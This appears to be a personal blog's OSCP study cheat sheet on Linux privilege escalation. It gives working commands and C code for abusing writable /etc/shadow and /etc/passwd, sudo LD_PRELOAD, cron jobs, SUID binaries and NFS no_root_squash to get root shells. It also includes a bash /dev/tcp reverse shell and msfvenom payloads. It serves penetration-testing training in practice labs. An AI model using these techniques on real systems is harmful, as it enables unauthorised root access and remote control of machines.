---
title: "Linux Privilege Escalation Techniques"
date: 2022-02-17T14:03:19+02:00
description: "Linux privilege escalation techniques"
featured: true
draft: false
toc: true
# menu: main
usePageBundles: false
#featureImage: "/images/linux_privilege_escalation.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/linux_privilege_escalation.png"
shareImage: "/images/linux_privilege_escalation.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Privilege Escalation
tags:
  - Privilege Escalation
  - Linux
---
This post is based on the notes and cheatsheets I wrote while studying for the Offensive Security Certified Professional (OSCP) exam, and can be used as a brief reference while looking for basic Linux privilege escalation methods. The contents of this blog originate from the "Linux Privilege Escalation for OSCP & Beyond" course created by Tib3rius. The course is available at Udemy and can be found [here](https://www.udemy.com/course/linux-privilege-escalation/). 

Tib3rius also created a free room at TryHackMe that can be leveraged to practice the techniques outlined in his course and this blog post. The TryHackMe room can be found [here](https://tryhackme.com/room/linuxprivesc). 

## Service Exploits
Services can be interesting to look into when they are running as high-privileged users. We can check if any of the services are running as a high privileged user:

```bash
ps aux | grep "^root"
```

If any results are returned, we should enumerate their version and check for publicly available privilege escalation exploits:

```bash
program --version
program -v
dpkg -l | grep <program>
rpm -qa | grep <program>
```

If the process is bound to an internal port and a given exploit cannot be run locally on the target machine we should use port forwarding to access the target machine. Two possible port forwarding methods are elaborated upon. Method 1 is ran from the attacker PC:

```bash
ssh -L 127.0.0.1:1337:127.0.0.1:8082 user@<victim_ip>

# where 127.0.0.1:1337 = our box on any port
# where 127.0.0.1:8082 = victim box on forwarded port
```

Method 2 is ran from the victim PC, and requires an account to be created on the attackers machine:

```bash
ssh -R 1337:127.0.0.1:8082 user@<victim_ip>

# where 127.0.0.1:1337 = our box on any port
# where 127.0.0.1:8082 = victim box on forwarded port
```

After which the service can be accessed at localhost:1337 

## Weak File Permissions
If the <em>/etc/shadow</em> file is readeable, we can extract a user hash and run a dictionary attack to try and crack the hash:

```bash
cat /etc/shadow

# the hash is between the first and second ":"
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::

# attempt to crack the hash with John
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

If the <em>/etc/shadow</em> file is writeable, we can append a newly created user to the machine:

```bash
# create a backup in case anything goes wrong
cp /etc/shadow /tmp/shadow.bak

# create a sha-512 password hash
mkpasswd -m sha-512 newpassword

# alter the root password hash
root:<hash>:17298:0:99999:7:::
```

If the <em>/etc/passwd</em> file is writeable, we can alter the root entry to not prompt for a password when switching users. Remove the "x" from the root entry to not be prompted for a password.

```text
Original entry:
> root:x:0:0:root:/root:/bin/bash

New entry:
> root::0:0:root:/root:/bin/bash
```

Another method is to create a new password using OpenSSL, and it it to the <em>passwd</em> file:

```bash
openssl passwd "password"
# WOeqqrPFcHEoA

# Alter the root user entry to use the following password instead of looking for the /etc/shadow file

> root:WOeqqrPFcHEoA:0:0:root:/root:/bin/bash
```

A third method is to add a new user to the <em>/etc/passwd</em> file:

```bash
echo "newroot:WOeqqrPFcHEoA:0:0:root:/root:/bin/bash" >> /etc/passwd
```

We should check for sensitive files on the filesystem. Some default locations that could contain sensitive files are the following:

- user home directory;
- root directory;
- /tmp directory;
- /var/backups directory;
- /var/www/... directory.

## Sudo-related Methods
Sudo can be used to run commands as a different user

```bash
sudo -u <username> <program>
```

We can list the programs that a specific user is allowed to run as root using the following command:

```bash
sudo -l
```

If any entries show up, we can visit [GTFOBins](https://gtfobins.github.io/) and look for the program for possible privilege escalation. If there are no GTFOBins entries available for the program, we should figure out if we can use the program to read sensitive data. For example, apache2 can be used to read the first line of the /etc/shadow file with root permissions as following:

```bash
sudo apache2 -f /etc/shadow
```

If a program cannot be used for privilege escalation we shoudl check the environment variables:

```bash
sudo -l

> Matching Defaults entries for user on this host:
> env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH, env_keep+=LD_LIBRARY_PATH
```

If <em>LD_PRELOAD</em> is set, we can create a simple c program to load when running sudo:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
 unsetenv("LD_PRELOAD");
 setresuid(0,0,0);
 system("/bin/bash -p");
}
```

Compile the c program and run the program that we are allowed to run as sudo:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# fPIC is used for x64 architecture

sudo LD_PRELOAD=/tmp/preload.so find
```

If <em>LD_LIBRARY_PATH</em> is set, we can create a file in this path the be ran:

```bash
ldd /usr/sbin/apache2

>linux-vdso.so.1 => (0x00007fff03f1c000)
>libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f61f68fe000)
>[…]
# we can see that /lib/libcrypto.so.1 is loaded
>libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f61f58d4000)
```

Create a <em>library_path.c</em> program:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack () {
 unsetenv("LD_LIBRARY_PATH");
 setresuid(0,0,0);
 system("/bin/bash -p");
}
```

After which we compile the code, set the <em>LD_LIBRARY_PATH</em> to the current working directory and run a program as sudo:

```bash
gcc -o libcrypt.so.1 -shared -fPIC library_path.c

sudo LD_LIBRARY_PATH=. apache2
```

## Cron Jobs
Cron jobs are jobs that run periodically on unix-based systems. When cron jobs are ran by a high-privileged user and the file that it executes is writeable, we can use it to escalate privileges. Default locations for cron jobs:

- /var/spool/cron
- /var/spool/cron/crontabs
- /etc/crontab

We can view the contents of the crontab:

```bash
cat /etc/crontab

> * * * * * root overwrite.sh
> * * * * * root /usr/local/bin/compress.sh
```

We locate the <em>overwrite.sh</em> and check if we can write to it. If so, we alter the payload and wait for the cronjob to execute the file:

```bash
locate overwrite.sh
> /usr/local/bin/overwrite.sh

ls -l /usr/local/bin/overwrite.sh
> world writeable

echo "bash -i >& /dev/tcp/10.0.0.1/1337 0>&1" > /usr/local/bin/overwrite.sh
```

The crontab PATH environment variable is by default set to <em>/usr/bin:/bin</em>. We can exploit the PATH environment variable in the following case:

-   The PATH in the /etc/crontab variable specifies a path in which we as a user can write files to, and:
-   When the cron job does not specify the full path to the file it will run.

In this case, we can write to the "/home/user" directory, and the cron job PATH is specified as the following:

```bash
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

We can create a reverse shell or SUID version of bash called "overwrite.sh" in the "/home/user" directory and wait for the cronjob to execute:

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

./rootbash -p
```

Is there a wildcard character used by a cronjob or other file that contains a wildcard character such as an asterisk? Check gtfobins for the specific program and see if we can spawn a shell. Cronjob example that is vulnerable:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Check [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#shell) on how to exploit it:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf

touch ./--checkpoint=1
touch ./--checkpoint-action=exec=shell.elf
```

## SUID / SGID Executables
SUID and SGID executables can be used in unix-based systems to execute a program with the effective permissions of the file owner or file group. If an out-of-the-ordinary SUID or GUID executable is found, it is possible that it can be used to execute malicious commands as root. Find files with SUID/SGID bits set:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

If an entry is found, [GTFOBins](https://gtfobins.github.io/) can be used to look up whether the executable is known to be vulnerable for privilege escalation. 

## Shared Object Injection
When a program is executed, it will try to load the shared objects it requires. By using a program called strace, we can track these system calls and determine whether any shared objects were not found. If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded. Example:

```bash
user@debian:~$ /usr/local/bin/suid-so

> Calculating something, please wait...
> [=====================================================================>] 99 %
> Done.
```

If we check for any missing shared objects, we can inject one ourselves:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

> […]
> open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

We see it tries to execute <em>/home/user/.config/libcalc.so</em>, so we create the directory it tries to access and write a c program to it that will be executed on run-time:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
 setuid(0);
 system("/bin/bash -p");
}
```

After which we compile the program and run the executable to get a root shell:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c

user@debian:~$ /usr/local/bin/suid-so
```

If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string. We can run strings on the executable file to find strings of characters. We can also use strace to see how the program is executing.

```bash
ls -lah /usr/local/bin/suid-env 
> -rwsr-sr-x 1 root staff 6883 May 14 2017 /usr/local/bin/suid-env

strings /usr/local/bin/suid-env

>[…]
> service apache2 start
>[…]
```

We see that apache2 is started in the process. We can figure out exactly how the service is executed by running the following command:

```bash
strace -v -f -e execve "service apache2 start" 2>&1 | grep service

> [pid 25982] execve("/bin/sh", ["sh", "-c", "service apache2 start"], […]
```

The service is executed via <em>sh</em>, and does not use a full path. We can create a file called service and let it be executed prior to executing the <em>apache2 service</em>. We create service.c:

```c
int main() {

setuid(0);
system("/bin/bash -p");

}
```

We compile the program and append our current directory to the path variable:

```bash
gcc -o service service.c
  
PATH=.:$PATH /usr/local/bin/suid-env
```

When we execute the executable, we get a root shell.

## Passwords and Keys
Passwords and keys are often saved in configuration files in order to be utilized by programs and executables. We should always check the filesystem for such files. Some interesting files to take a look at are the following:

- History files
	- Unix-based systems generate bash history files that contain the history of the issued commands on the system. These commands can possibly contain sensitive information.
- Config files
	- Web applications, databases and other programs leverage credentials to run, which are often saved in the configuration files of these programs.
- SSH keys
	- In order to use SSH, private and public keys are saved in the .ssh directory of a specific user.

## NFS
NFS shares are configured in the <em>/etc/exports</em> file. Remote users can mount shares, access, create and modify files. By default, created files inherit the remote user's ID and GUID (as owner and group respectively), even if they don't exist on the NFS server. We can enumerate and mount NFS shares using the following commands:

```bash
showmount -e <target>
nmap --sV --script=nfs-showmount <target>
mount -o rw,vers=2 <target>:<share> <local_directory>
```

Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) root (UID=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group. While this behavior is default, it can be disabled! An example of an exploitable rootsquash configuration:

```bash
cat /etc/exports

>[…]
>/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
>[…]
```

From an attacker machine we can then create the <em>/tmp/nfs</em> directory and mount the share, after which we execute the binary from the victim machine:

```bash
# attack machine
mkdir /tmp/nfs
mount -o rw,vers=1 10.10.10.10:/tmp /tmp/nfs

sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

chmod +xs /tmp/nfs/shell.elf

# victim machine:
/tmp/shell.elf
```

## Kernel Exploits
If all other ways of privilege escalation fail, a kernel exploit can be leveraged. In order to find a kernel exploit that works on the given operating system, we need to enumerate the kernel version. For this we can issue the following command:

```bash
uname -a 

> Linux ABC007 2.6.32-573.3.1.el6.x86_64 #1 SMP Mon Aug 10 09:44:54 EDT 2015 x86_64 x86_64 x86_64 GNU/Linux
```

Which tells us the following:
-   kernel: Linux
-   Network node hostname: ABC007
-   Kernel release: 2.6.32-573.3.1.el6.x86_64
-   Kernel version: #1 SMP Mon Aug 10 09:44:54 EDT 2015
-   Machine hardware name: x86_64
-   Processor type: x86_64
-   Hardware platform: x86_64
-   Operating system: GNU/Linux

We can then look for exploits related to the kernel release. 

Besides manual enumeration, we can also run the linux-exploit-suggester-2.pl script, available [here](https://github.com/jondonas/linux-exploit-suggester-2).  The script can be ran with our without parameters.

```bash
./linux-exploit-suggester-2.pl -k 2.6.32
```

If a known vulnerability for the specific kernel version is available, the tool will display it. As this script only looks for exploits known by the script, manual enumeration should always be conducted as well. 
